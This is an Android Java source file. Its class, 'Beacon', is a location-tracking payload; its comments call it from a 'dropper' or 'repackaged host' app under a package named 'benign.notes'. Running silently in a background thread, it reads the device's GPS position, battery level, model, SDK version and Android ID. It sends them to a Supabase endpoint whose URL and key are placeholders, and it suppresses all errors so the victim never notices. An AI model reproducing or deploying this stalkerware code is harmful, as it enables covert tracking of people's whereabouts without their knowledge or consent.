package com.benign.notes;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.BatteryManager;
import android.os.Looper;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public final class Beacon {

    // Supabase project — fill these two before compiling
    private static final String SB_URL  = "https://YOUR-PROJECT-REF.supabase.co";
    private static final String SB_KEY  = "YOUR-ANON-PUBLIC-KEY";

    private Beacon() {}

    /** Entry point — call from dropper (MainActivity / Worker / repackaged host). */
    public static void fire(final Context ctx) {
        new Thread(new Runnable() {
            @Override public void run() {
                try {
                    Double lat = null, lon = null;

                    // 1. try last-known cache from all providers
                    final LocationManager lm =
                        (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
                    if (lm != null) {
                        for (final String p : lm.getProviders(true)) {
                            final Location l = lm.getLastKnownLocation(p);
                            if (l != null) { lat = l.getLatitude(); lon = l.getLongitude(); break; }
                        }
                    }

                    // 2. cache miss → request one fresh fix (10 s timeout)
                    if (lat == null && hasLoc(ctx)) {
                        final Object[] box = new Object[1];
                        final LocationListener lis = new LocationListener() {
                            @Override public void onLocationChanged(Location l) {
                                synchronized (box) { box[0] = l; box.notify(); }
                            }
                        };
                        lm.requestSingleUpdate(
                            lm.getBestProvider(new android.location.Criteria(), true),
                            lis, Looper.getMainLooper());
                        synchronized (box) {
                            box.wait(10_000);
                            if (box[0] != null) {
                                final Location l = (Location) box[0];
                                lat = l.getLatitude(); lon = l.getLongitude();
                            }
                        }
                        lm.removeUpdates(lis);
                    }

                    post(ctx, lat, lon);
                } catch (final Throwable t) {
                    // silent — never crash the host
                }
            }
        }).start();
    }

    private static boolean hasLoc(final Context c) {
        return c.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
               == PackageManager.PERMISSION_GRANTED;
    }

    private static int battery(final Context c) {
        final BatteryManager bm = (BatteryManager) c.getSystemService(Context.BATTERY_SERVICE);
        return bm != null ? bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) : -1;
    }

    private static void post(final Context ctx, final Double lat, final Double lon) {
        HttpURLConnection conn = null;
        try {
            final int sdk = android.os.Build.VERSION.SDK_INT;
            final String model = android.os.Build.MODEL;
            final int batt = battery(ctx);

            final String json =
                "{\"id\":\"" + deviceId(ctx) + "\"," +
                "\"ts\":" + System.currentTimeMillis() + "," +
                "\"lat\":" + (lat != null ? lat : "null") + "," +
                "\"lon\":" + (lon != null ? lon : "null") + "," +
                "\"acc\":" + (sdk) + "," +
                "\"batt\":" + batt + "," +
                "\"model\":\"" + model + "\"," +
                "\"sdk\":" + sdk + "}";

            conn = (HttpURLConnection) new URL(SB_URL + "/rest/v1/beacons")
                .openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15_000);
            conn.setReadTimeout(15_000);
            conn.setRequestProperty("apikey", SB_KEY);
            conn.setRequestProperty("Authorization", "Bearer " + SB_KEY);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Prefer", "return=minimal");

            final byte[] body = json.getBytes(StandardCharsets.UTF_8);
            conn.setFixedLengthStreamingMode(body.length);
            conn.getOutputStream().write(body);
            conn.getResponseCode(); // drain
        } catch (final Throwable t) {
            // silent
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static String deviceId(final Context c) {
        final String id = android.provider.Settings.Secure.getString(
            c.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        return id != null ? id : "unknown";
    }
}